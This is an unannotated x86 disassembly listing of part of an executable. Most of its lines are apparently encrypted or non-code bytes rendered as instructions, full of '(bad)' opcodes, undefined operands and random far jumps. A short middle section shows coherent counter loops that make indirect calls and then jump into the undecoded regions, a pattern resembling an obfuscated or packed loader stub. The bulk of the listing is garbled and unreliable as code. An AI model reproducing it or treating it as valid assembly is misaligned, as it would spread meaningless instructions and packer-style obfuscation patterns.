  40aa24:	aaa    
  40aa25:	mov    dl,0x2
  40aa27:	xlat   BYTE PTR ds:[ebx]
  40aa28:	pop    esp
  40aa29:	push   esp
  40aa2a:	popa   
  40aa2b:	dec    eax
  40aa2c:	sub    BYTE PTR [ebp-0x2b],cl
  40aa2f:	add    BYTE PTR [eax+0x75a4369b],0x3d
  40aa36:	cdq    
  40aa37:	repnz (bad) 
  40aa39:	mov    esi,0x3e5ad780
  40aa3e:	adc    DWORD PTR [edx],esp
  40aa40:	xchg   ebp,eax
  40aa41:	push   0x587fb13f
  40aa46:	ja     0x40aa83
  40aa48:	call   0xf371d131
  40aa4d:	loop   0x40aa5f
  40aa4f:	cmp    al,ch
  40aa51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa52:	outs   dx,DWORD PTR ds:[esi]
  40aa53:	xchg   ebx,eax
  40aa54:	dec    esp
  40aa55:	jp     0x40aa6e
  40aa57:	mov    al,0x13
  40aa59:	(bad)  
  40aa5a:	lds    esp,FWORD PTR [ebx-0x3ffa47ed]
  40aa60:	pop    ebx
  40aa61:	retf   0xf734
  40aa64:	adc    ch,BYTE PTR [ebp+0x5e]
  40aa67:	das    
  40aa68:	add    eax,0xd8ed6bec
  40aa6d:	jl     0x40aa1d
  40aa6f:	add    dl,BYTE PTR [edx+0x6d]
  40aa72:	inc    edi
  40aa73:	in     al,0xc3
  40aa75:	push   cs
  40aa76:	call   0x19724061
  40aa7b:	pop    esp
  40aa7c:	cld    
  40aa7d:	shl    BYTE PTR [edx+0x5cfdb99],0x61
  40aa84:	fild   QWORD PTR [eax+0x6e]
  40aa87:	cmp    al,0x5a
  40aa89:	jmp    FWORD PTR [ebx-0x826c4d0]
  40aa8f:	jmp    0x40aaa6
  40aa91:	mov    DWORD PTR [ebp+0x6a],ebp
  40aa94:	retf   0x96f1
  40aa97:	jo     0x40aa8e
  40aa99:	sub    bh,BYTE PTR [edi]
  40aa9b:	mov    esi,0x66d156f5
  40aaa0:	xchg   esi,eax
  40aaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa2:	bound  ecx,QWORD PTR [edi-0x4f216ec8]
  40aaa8:	dec    ebx
  40aaa9:	sbb    BYTE PTR [edi],bl
  40aaab:	push   ds
  40aaac:	daa    
  40aaad:	fadd   QWORD PTR [ecx-0x12]
  40aab1:	adc    al,0xcd
  40aab3:	dec    edx
  40aab4:	pop    ss
  40aab5:	pop    edi
  40aab6:	aam    0x59
  40aab8:	sar    DWORD PTR [ebx-0xaa1a43a],1
  40aabe:	pusha  
  40aabf:	cmp    dl,dh
  40aac1:	inc    ebx
  40aac2:	mov    cl,0xf8
  40aac4:	xchg   esi,eax
  40aac5:	cmp    edi,DWORD PTR [edi+edx*2]
  40aac8:	lahf   
  40aac9:	add    al,BYTE PTR [esi]
  40aacb:	imul   eax,esi,0x804f8271
  40aad1:	ss push ebp
  40aad3:	sub    BYTE PTR [esi-0x1f],ch
  40aad6:	fs jmp 0x4907:0x59904471
  40aade:	out    0x7a,eax
  40aae0:	nop
  40aae1:	es xchg edi,eax
  40aae3:	iret   
  40aae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aae5:	je     0x40ab38
  40aae7:	add    DWORD PTR [edx*8-0x1d459b6c],edi
  40aaee:	mov    ebx,0x8738380c
  40aaf3:	stc    
  40aaf4:	pop    edi
  40aaf5:	cmc    
  40aaf6:	mov    edi,0xec56654f
  40aafb:	mov    edx,0x6f1c4b34
  40ab00:	add    ecx,eax
  40ab02:	std    
  40ab03:	loop   0x40ab70
  40ab05:	and    dl,BYTE PTR [edi-0x10]
  40ab08:	fiadd  WORD PTR [eax-0x3e]
  40ab0b:	mov    cl,0x97
  40ab0d:	ret    
  40ab0e:	ss ins BYTE PTR es:[edi],dx
  40ab10:	les    edx,FWORD PTR [ebp+0x29]
  40ab13:	popf   
  40ab14:	dec    ebp
  40ab15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab16:	jmp    0x40aafd
  40ab18:	mov    cl,0x5e
  40ab1a:	mov    ecx,cs
  40ab1c:	call   0xd440:0x53021113
  40ab23:	pop    esi
  40ab24:	fdivp  st(2),st
  40ab26:	test   bl,dh
  40ab28:	fidiv  WORD PTR ds:0x7008a16d
  40ab2e:	and    bh,0x8b
  40ab31:	in     al,dx
  40ab32:	(bad)  
  40ab33:	mov    bl,0x6d
  40ab35:	ds dec ebx
  40ab37:	retf   
  40ab38:	fstp   QWORD PTR [eax+0x6dea98f8]
  40ab3e:	lds    ebx,FWORD PTR [ecx]
  40ab40:	adc    dl,BYTE PTR [ecx+0x7b]
  40ab43:	out    dx,al
  40ab44:	call   0x8110e3aa
  40ab49:	jge    0x40ab37
  40ab4b:	cwde   
  40ab4c:	test   al,0x21
  40ab4e:	shr    ebx,cl
  40ab50:	sbb    DWORD PTR [edx+0x63],0x6f2c4be4
  40ab57:	or     eax,0x63
  40ab5a:	xchg   ecx,eax
  40ab5b:	iret   
  40ab5c:	push   es
  40ab5d:	pop    esp
  40ab5e:	pushf  
  40ab5f:	cmp    DWORD PTR [eax+0x6b],ecx
  40ab62:	mov    ebp,0xd1f6f8fa
  40ab67:	xor    ah,bh
  40ab69:	inc    ebx
  40ab6a:	cld    
  40ab6b:	inc    edx
  40ab6c:	scas   eax,DWORD PTR es:[edi]
  40ab6d:	fidivr DWORD PTR [esi+0x23]
  40ab70:	and    ebp,DWORD PTR [ecx+0x59d5066]
  40ab76:	out    dx,eax
  40ab77:	sub    ah,al
  40ab79:	icebp  
  40ab7a:	push   eax
  40ab7b:	xchg   DWORD PTR [eax+0xd67021b],ecx
  40ab81:	test   DWORD PTR [ebx],esp
  40ab83:	add    eax,0x3f8ccba
  40ab88:	pop    ds
  40ab89:	xor    eax,0xba458c3e
  40ab8e:	inc    esi
  40ab8f:	in     al,dx
  40ab90:	inc    edx
  40ab91:	loopne 0x40ab6c
  40ab93:	sub    DWORD PTR [ebx],0x6b8aed14
  40ab99:	mov    esp,0x34aea4b6
  40ab9e:	out    dx,al
  40ab9f:	cli    
  40aba0:	pop    ebx
  40aba1:	mov    ds,WORD PTR [esi-0x7d1f1ff3]
  40aba7:	test   DWORD PTR [eax+0x23],ebp
  40abaa:	lods   eax,DWORD PTR ds:[esi]
  40abab:	lods   eax,DWORD PTR ds:[esi]
  40abac:	dec    edx
  40abad:	add    BYTE PTR [edx-0x9b7a9e3],al
  40abb3:	jae    0x40ab50
  40abb5:	(bad)
  40abb9:	ret    0x6f19
  40abbc:	cwde   
  40abbd:	xchg   esp,eax
  40abbe:	mov    dh,BYTE PTR [ebx-0x3c]
  40abc1:	adc    DWORD PTR [edi-0x2d],eax
  40abc4:	push   cs
  40abc5:	sbb    eax,0x8e8ce6c1
  40abca:	inc    edi
  40abcb:	mov    edi,0x2d0c28a8
  40abd0:	xchg   ebp,eax
  40abd1:	mov    eax,ds:0x89e34917
  40abd6:	xor    edx,DWORD PTR [ebx+ecx*8-0x2d7d77d3]
  40abdd:	retf   
  40abde:	mov    ah,0x41
  40abe0:	sar    DWORD PTR [ecx+ecx*1-0x2271cba1],cl
  40abe7:	outs   dx,BYTE PTR ds:[esi]
  40abe8:	inc    edi
  40abe9:	adc    ebp,DWORD PTR [edx]
  40abeb:	adc    ah,BYTE PTR [esi-0xf]
  40abee:	pop    esi
  40abef:	xchg   BYTE PTR [ebp-0x65b0121],dl
  40abf5:	out    dx,eax
  40abf6:	in     al,0xd8
  40abf8:	test   BYTE PTR [edi+0x20ca1c58],0xc5
  40abff:	mov    DWORD PTR [ebx],esi
  40ac01:	rol    BYTE PTR [ecx+0x42fcf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	out    0x42,eax
  40ac0b:	add    BYTE PTR [ebx],al
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e703
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40add7
  40adb4:	sub    BYTE PTR [ecx],dl
  40adb6:	xchg   ebx,eax
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad5f
  40adc0:	pop    esp
  40adc1:	fiadd  DWORD PTR [eax]
  40adc3:	adc    ah,BYTE PTR ds:0x76a4409e
  40adc9:	fwait
  40adca:	pop    edi
  40adcb:	pop    ecx
  40adcc:	imul   edx,DWORD PTR [eax+0x114b3726],0x817cfdf8
  40add6:	lods   al,BYTE PTR ds:[esi]
  40add7:	pop    edx
  40add8:	sub    esi,DWORD PTR [edx+esi*2]
  40addb:	mov    ebx,0x34e27cd8
  40ade0:	sar    DWORD PTR [edx],0xc4
  40ade3:	lock sbb eax,0x94794f22
  40ade9:	ins    DWORD PTR es:[edi],dx
  40adea:	loop   0x40ae01
  40adec:	ds fdiv st,st(6)
  40adef:	pop    es
  40adf0:	fcmovnb st,st(4)
  40adf2:	addr16 mov ebx,0x78838186
  40adf8:	ret    0x62ba
  40adfb:	daa    
  40adfc:	das    
  40adfd:	xchg   ebx,eax
  40adfe:	adc    eax,0xca56259e
  40ae03:	outs   dx,BYTE PTR ds:[esi]
  40ae04:	push   ss
  40ae05:	jmp    0x61de4396
  40ae0a:	cmp    bh,bh
  40ae0c:	sub    BYTE PTR [ebx+0x7dd11f42],ah
  40ae12:	jns    0x40ae39
  40ae14:	addr16 jle 0x40ae4d
  40ae17:	cmp    DWORD PTR [edx-0x295fd789],eax
  40ae1d:	push   ds
  40ae1e:	jae    0x40ae48
  40ae20:	jmp    FWORD PTR [ebx+0x47]
  40ae23:	dec    edi
  40ae24:	and    BYTE PTR [esi],al
  40ae26:	icebp  
  40ae27:	xchg   esp,eax
  40ae28:	aas    
  40ae29:	aad    0xd1
  40ae2b:	sbb    bh,BYTE PTR [edx-0x26]
  40ae2e:	js     0x40ae23
  40ae30:	add    eax,0x126ac177
  40ae35:	mov    al,ss:0x6bb307c5
  40ae3b:	dec    ecx
  40ae3c:	or     ebx,DWORD PTR [edx+0x6341e606]
  40ae42:	cmp    DWORD PTR [ebx-0x664d5eaa],0xb7f13942
  40ae4c:	push   ds
  40ae4d:	enter  0x3df4,0x6c
  40ae51:	add    al,0xf0
  40ae53:	sbb    esp,0x5d73f94
  40ae59:	out    dx,eax
  40ae5a:	je     0x40ae2a
  40ae5c:	test   DWORD PTR [ecx+0x49255d05],esp
  40ae62:	add    ebp,DWORD PTR [ecx-0x25]
  40ae65:	fs addr16 hlt 
  40ae68:	jge    0x40aeca
  40ae6a:	gs int 0xf4
  40ae6d:	fwait
  40ae6e:	adc    ebp,DWORD PTR [ebx-0x77559ef0]
  40ae74:	je     0x40aedc
  40ae76:	and    ch,dh
  40ae78:	mov    DWORD PTR [esi],edi
  40ae7a:	in     eax,0xf7
  40ae7c:	jbe    0x40aece
  40ae7e:	mov    eax,DWORD PTR [esi-0x64945e6c]
  40ae84:	mov    edx,0x1612db7a
  40ae89:	int    0xb
  40ae8b:	pop    esi
  40ae8c:	xor    eax,0xef93f254
  40ae91:	sbb    eax,0x5040670d
  40ae96:	add    DWORD PTR [ebp+0x30a8091e],edi
  40ae9c:	fimul  WORD PTR [ebp+0x3f6c14fc]
  40aea2:	or     al,0x44
  40aea4:	repz add al,0x3f
  40aea7:	pusha  
  40aea8:	fld    QWORD PTR [ebx-0x4b]
  40aeab:	pop    cx
  40aead:	call   0x63c:0xd48b880e
  40aeb4:	fmulp  st(2),st
  40aeb6:	dec    ebx
  40aeb7:	fild   WORD PTR [edx-0x19e71ffb]
  40aebd:	xor    DWORD PTR [ecx],ecx
  40aebf:	xor    bh,ch
  40aec1:	adc    bl,al
  40aec3:	fld    TBYTE PTR [ebp-0x9b6d356]
  40aec9:	imul   ebx,DWORD PTR ss:[edi-0x25eca245],0x68
  40aed1:	in     eax,dx
  40aed2:	rcl    BYTE PTR [ebx-0x70092a2a],cl
  40aed8:	outs   dx,BYTE PTR ds:[esi]
  40aed9:	(bad)  
  40aedb:	add    cl,BYTE PTR [ebp+0x394ebb45]
  40aee1:	cs clc 
  40aee3:	test   ax,0x3892
  40aee7:	icebp  
  40aee8:	adc    al,0x64
  40aeea:	fwait
  40aeeb:	mov    eax,0xad4bd3d1
  40aef0:	cmp    DWORD PTR [eax+0x512326c],edi
  40aef6:	jle    0x40aea2
  40aef8:	and    al,ah
  40aefa:	ret    
  40aefb:	push   ss
  40aefc:	xchg   BYTE PTR [ebx-0x7fcead8a],al
  40af02:	int    0xa5
  40af04:	sahf   
  40af05:	sbb    ch,BYTE PTR [ecx+0x65541528]
  40af0b:	sbb    eax,0xe1ded5b7
  40af10:	adc    eax,0x6ab77cba
  40af15:	clc    
  40af16:	aad    0xcb
  40af18:	mov    ecx,0x78fa0546
  40af1d:	in     al,0x55
  40af1f:	ror    BYTE PTR [ecx-0x77],cl
  40af22:	mov    dh,0xae
  40af24:	mov    al,ds:0xfd0f6990
  40af29:	cmp    BYTE PTR [edx-0x6a],al
  40af2c:	mov    ebp,0xa866f579
  40af31:	inc    edx
  40af32:	ss leavew 
  40af35:	arpl   WORD PTR [edx],sp
  40af37:	xchg   ebx,eax
  40af39:	jno    0x40afb9
  40af3b:	adc    al,0x10
  40af3d:	inc    esi
  40af3e:	shr    BYTE PTR [eax+0x2f],1
  40af41:	xchg   edx,eax
  40af42:	mov    dl,0x15
  40af44:	fistp  QWORD PTR [eax-0xf]
  40af47:	jb     0x40af6c
  40af49:	sbb    esp,DWORD PTR [esp+esi*1]
  40af4c:	imul   ecx,DWORD PTR [edx],0x2b
  40af4f:	ins    DWORD PTR es:[edi],dx
  40af50:	mov    ebp,0x21a414c
  40af55:	add    bh,BYTE PTR fs:[edx+edx*2-0x70]
  40af5a:	ds adc dh,dh
  40af5d:	and    ecx,ecx
  40af5f:	mov    bl,0xb
  40af61:	dec    eax
  40af62:	xchg   ebp,eax
  40af63:	mov    bl,0x99
  40af65:	pop    ds
  40af66:	cmp    bh,al
  40af68:	xchg   edi,eax
  40af69:	sbb    DWORD PTR [esi],ebx
  40af6b:	xor    eax,DWORD PTR [esi-0x349aac9]
  40af71:	cmp    eax,0x96513694
  40af76:	fnstenv [ebp-0x3]
  40af79:	repnz std 
  40af7b:	inc    ecx
  40af7c:	add    esi,ebp
  40af7e:	adc    BYTE PTR [edx-0x2c],ah
  40af81:	retf   0x36c3
  40af84:	lock in eax,0x1e
  40af87:	(bad)  
  40af88:	repnz mov eax,ds:0x3f821986
  40af8e:	mov    ecx,0x5312d955
  40af93:	push   esi
  40af94:	add    dh,BYTE PTR [ecx]
  40af96:	dec    edi
  40af97:	lods   eax,DWORD PTR ds:[esi]
  40af98:	xor    edi,DWORD PTR [ebx-0x78]
  40af9b:	les    edx,FWORD PTR [ebp+0x57130f04]
  40afa1:	mov    ebp,0xea8a9ef7
  40afa6:	addr16 aam 0xc6
  40afa9:	(bad)  
  40afaa:	cmp    BYTE PTR [ecx+0x1d],al
  40afad:	aas    
  40afae:	pop    es
  40afaf:	mov    esp,0x8b960876
  40afb4:	cdq    
  40afb5:	jo     0x40af4f
  40afb7:	(bad)  
  40afb8:	xor    esi,ebp
  40afba:	push   es
  40afbb:	(bad)  
  40afbc:	call   0xf3de:0xbde22792
  40afc3:	mov    esi,0x5ec66d1d
  40afc8:	loop   0x40afa9
  40afca:	mov    edx,0x33ee2ac7
  40afcf:	ret    0xd3f4
  40afd2:	xchg   BYTE PTR [ecx],bh
  40afd4:	or     ebp,DWORD PTR [ebx]
  40afd6:	jns    0x40aff6
  40afd8:	jo     0x40afe1
  40afda:	in     al,dx
  40afdb:	add    ebx,DWORD PTR [ebx]
  40afdd:	lods   eax,DWORD PTR ds:[esi]
  40afde:	scas   eax,DWORD PTR es:[edi]
  40afdf:	das    
  40afe0:	ja     0x40b00f
  40afe2:	jb     0x40afb7
  40afe4:	push   0xe
  40afe6:	dec    esi
  40afe7:	clc    
  40afe8:	and    DWORD PTR [edi-0x50],edi
  40afeb:	lds    ebx,FWORD PTR [edi]
  40afed:	ret    
  40afee:	pop    esi
  40afef:	in     eax,dx
  40aff0:	sbb    al,0xc8
  40aff2:	sub    esp,0xfffffff2
  40aff5:	jmp    0x7e8c:0xd9c38bc7
  40affc:	pop    ebx
  40affd:	sub    ebp,DWORD PTR [ebp-0x2bf3164e]
  40b003:	mov    BYTE PTR [ecx],cl
  40b005:	or     eax,0x301b84f3
  40b00a:	jne    0x40af9c
  40b00c:	xor    edi,esp
  40b00e:	call   0x3fea:0xcb7b2bdf
  40b015:	(bad)  
  40b016:	ficom  WORD PTR [edx-0x25a438b1]
  40b01c:	fimul  DWORD PTR [edi-0x1d2ea79f]
  40b022:	xchg   ebp,eax
  40b023:	add    eax,edx
  40b025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b026:	fxch   st(4)
  40b028:	mov    ebx,0xb248af5b
  40b02d:	lds    esi,FWORD PTR [ebp-0x4521f22]
  40b033:	mov    bh,0x11
  40b035:	xor    BYTE PTR ds:0x4253205a,0x9a
  40b03c:	call   0x6eceb520
  40b041:	and    cl,BYTE PTR [esi]
  40b043:	loope  0x40afe6
  40b045:	stos   DWORD PTR es:[edi],eax
  40b046:	sbb    ebp,DWORD PTR [edx]
  40b048:	adc    ecx,0x3affee54
  40b04e:	xchg   ebx,eax
  40b04f:	jmp    0xb04e302a
  40b054:	mov    esi,0x87abef5d
  40b059:	scas   eax,DWORD PTR es:[edi]
  40b05a:	xchg   BYTE PTR [ecx],ch
  40b05c:	inc    ecx
  40b05d:	lahf   
  40b05e:	push   ebp
  40b05f:	fbstp  TBYTE PTR [edx-0x31f195d9]
  40b065:	fimul  DWORD PTR [eax-0x63574d05]
  40b06b:	sbb    DWORD PTR [edi],ecx
  40b06d:	in     al,dx
  40b06e:	into   
  40b06f:	outs   dx,DWORD PTR ds:[esi]
  40b070:	js     0x40b0a1
  40b072:	cs das 
  40b074:	test   DWORD PTR [ecx+0x42],eax
  40b077:	push   esp
  40b078:	aam    0xac
  40b07a:	shr    DWORD PTR [ecx+0x134b9f41],1
  40b080:	aas    
  40b081:	mov    ecx,0xb10411db
  40b086:	ss mov es:0xbad647e7,eax
  40b08d:	sbb    dh,BYTE PTR [ebx-0x31]
  40b090:	xchg   ecx,eax
  40b091:	push   cs
  40b092:	pop    esi
  40b093:	jnp    0x40b10f
  40b095:	ins    DWORD PTR es:[edi],dx
  40b096:	loopne 0x40b018
  40b098:	or     bh,BYTE PTR [edi-0x74541580]
  40b09e:	mov    ?,WORD PTR cs:[edx]
  40b0a1:	xchg   DWORD PTR [edx-0x62a6f660],edx
  40b0a7:	call   0x674f:0xd5e67054
  40b0ae:	shl    BYTE PTR [ebx],1
  40b0b0:	mov    edi,0xcf52556d
  40b0b5:	xchg   esp,eax
  40b0b6:	ja     0x40b056
  40b0b8:	add    ebp,DWORD PTR [edx-0x66]
  40b0bb:	mul    BYTE PTR [ebp+0x728f80b8]
  40b0c1:	xchg   ebx,eax
  40b0c2:	mov    ch,dh
  40b0c4:	dec    eax
  40b0c5:	sahf   
  40b0c6:	adc    BYTE PTR [edi],0x81
  40b0c9:	shr    BYTE PTR [ebx-0x4f],1
  40b0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0cd:	repnz fwait
  40b0cf:	xchg   ebp,eax
  40b0d0:	and    BYTE PTR [ecx],bl
  40b0d2:	xor    eax,0x3a85126
  40b0d7:	mov    cl,0xe3
  40b0d9:	nop
  40b0da:	dec    ebx
  40b0db:	sbb    DWORD PTR [eax],0xd
  40b0de:	jge    0x40b124
  40b0e0:	loopne 0x40b0e9
  40b0e2:	mov    ebp,0x69ec67f1
  40b0e7:	stc    
  40b0e8:	pop    esp
  40b0e9:	idiv   esp
  40b0eb:	outs   dx,DWORD PTR ds:[esi]
  40b0ec:	in     al,dx
  40b0ed:	nop
  40b0ee:	and    bl,BYTE PTR [esi-0x21f9163f]
  40b0f4:	ret    
  40b0f5:	sbb    DWORD PTR [edi-0x56],edx
  40b0f8:	xor    bl,dl
  40b0fa:	push   edi
  40b0fb:	adc    ah,0x4a
  40b0fe:	pop    es
  40b0ff:	cmp    ebx,DWORD PTR [edx]
  40b101:	dec    esi
  40b102:	sbb    bh,BYTE PTR [edx+0x2]
  40b105:	cdq    
  40b106:	jbe    0x40b16a
  40b108:	mov    al,0x69
  40b10a:	jno    0x40b0df
  40b10c:	cmp    al,0x92
  40b10e:	jb     0x40b131
  40b110:	rol    DWORD PTR [esi+0x23],1
  40b113:	lahf   
  40b114:	mov    ds:0x88c7e114,eax
  40b119:	inc    esp
  40b11a:	pop    es
  40b11b:	(bad)  
  40b11c:	stc    
  40b11d:	popa   
  40b11e:	fs xor al,0xed
  40b121:	lods   al,BYTE PTR ds:[esi]
  40b122:	lods   eax,DWORD PTR ds:[esi]
  40b123:	daa    
  40b124:	mov    bh,0x52
  40b126:	cld    
  40b127:	je     0x8927162b
  40b12d:	or     al,ch
  40b12f:	cli    
  40b130:	and    al,cl
  40b132:	test   BYTE PTR [eax-0x5a],dh
  40b135:	inc    DWORD PTR [ebx]
  40b137:	cmp    eax,0xaf8371df
  40b13c:	jne    0x40b10b
  40b13e:	mov    edx,0xd896b318
  40b143:	inc    edi
  40b144:	inc    ecx
  40b145:	stos   DWORD PTR es:[edi],eax
  40b146:	shl    BYTE PTR [edi-0x7a],cl
  40b149:	pushf  
  40b14a:	sbb    DWORD PTR [esi+edx*4+0x3339f654],esi
  40b151:	lods   eax,DWORD PTR ds:[esi]
  40b152:	push   ecx
  40b153:	pop    ss
  40b154:	bound  ecx,QWORD PTR [esi+0x16174aca]
  40b15a:	mov    dh,0x87
  40b15c:	les    edx,FWORD PTR [ebx]
  40b15e:	out    0xe8,eax
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	or     edx,edx
  40b175:	fwait
  40b176:	ret    0xfaa2
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b19a
  40b180:	cld    
  40b181:	aaa    
  40b182:	jae    0x40b112
  40b184:	cwde   
  40b185:	pop    esi
  40b186:	add    DWORD PTR [edx+0x126cd5ce],edx
  40b18c:	sbb    cl,ah
  40b18e:	inc    esp
  40b18f:	addr16 in eax,0x53
  40b192:	adc    ebp,DWORD PTR ds:0x368a4c71
  40b198:	call   0x5982:0x8a8e9645
  40b19f:	in     al,dx
  40b1a0:	adc    BYTE PTR [esp+ecx*1-0x31430228],bl
  40b1a7:	xchg   edx,eax
  40b1a8:	aas    
  40b1a9:	xor    bh,ah
  40b1ab:	or     BYTE PTR [eax],ch
  40b1ad:	pop    edx
  40b1ae:	(bad)  
  40b1af:	sbb    eax,0x6a79456f
  40b1b4:	test   al,0x4f
  40b1b6:	pop    eax
  40b1b7:	mov    edx,0x70c6e222
  40b1bc:	xor    eax,0xdf155eb8
  40b1c1:	jl     0x40b155
  40b1c3:	mov    WORD PTR [ecx+eiz*4+0x17],?
  40b1c7:	loopne 0x40b203
  40b1c9:	cmp    eax,0x415489a2
  40b1ce:	push   ebp
  40b1cf:	pushf  
  40b1d0:	xchg   esp,eax
  40b1d1:	data16 jp 0x40b202
  40b1d4:	push   es
  40b1d5:	inc    esi
  40b1d6:	retf   0xb359
  40b1d9:	or     DWORD PTR [ebp+0x5a],esi
  40b1dc:	push   0x5e
  40b1de:	inc    ecx
  40b1df:	push   ebx
  40b1e0:	aaa    
  40b1e1:	test   eax,0x8c663642
  40b1e6:	pop    esi
  40b1e7:	inc    eax
  40b1e8:	les    esi,FWORD PTR [eax]
  40b1ea:	hlt    
  40b1eb:	and    esp,0x74961f72
  40b1f1:	cli    
  40b1f2:	mov    al,ds:0xd06ddf8c
  40b1f7:	inc    eax
  40b1f8:	sbb    bh,BYTE PTR [ecx+0x7a]
  40b1fb:	stos   BYTE PTR es:[edi],al
  40b1fc:	or     BYTE PTR [ebx+0x6b60f16a],bh
  40b202:	pop    edx
  40b203:	jnp    0x40b1c6
  40b205:	add    bh,bl
  40b207:	cmp    eax,0x64a0272f
  40b20c:	ja     0x40b1ef
  40b20e:	and    edx,DWORD PTR [edx+0x4c]
  40b211:	repnz in al,0x8
  40b214:	sub    bl,BYTE PTR [esi+0x1cc5e27]
  40b21a:	(bad)  
  40b21b:	fadd   DWORD PTR [esi]
  40b21d:	mov    eax,ds:0xc9089ef8
  40b222:	iret   
  40b223:	gs jns 0x40b207
  40b226:	jecxz  0x40b291
  40b228:	idiv   eax
  40b22a:	or     bl,BYTE PTR [ecx-0x13]
  40b22d:	xor    al,0xa3
  40b22f:	jae    0x40b1f1
  40b231:	xor    BYTE PTR [edx],bh
  40b233:	pop    ds
  40b234:	sub    BYTE PTR [ebx*8-0x18bbb725],0x7c
  40b23c:	repnz push cs
  40b23e:	inc    edx
  40b23f:	push   ss
  40b240:	mov    eax,ds:0x6c1c423d
  40b245:	xor    al,0x30
  40b247:	int    0xbd
  40b249:	pushf  
  40b24a:	fisubr WORD PTR [edi+0x71f52d37]
  40b250:	mov    ah,0xf9
  40b252:	sub    DWORD PTR [eax-0x7d8bba3f],ebx
  40b258:	xchg   edx,eax
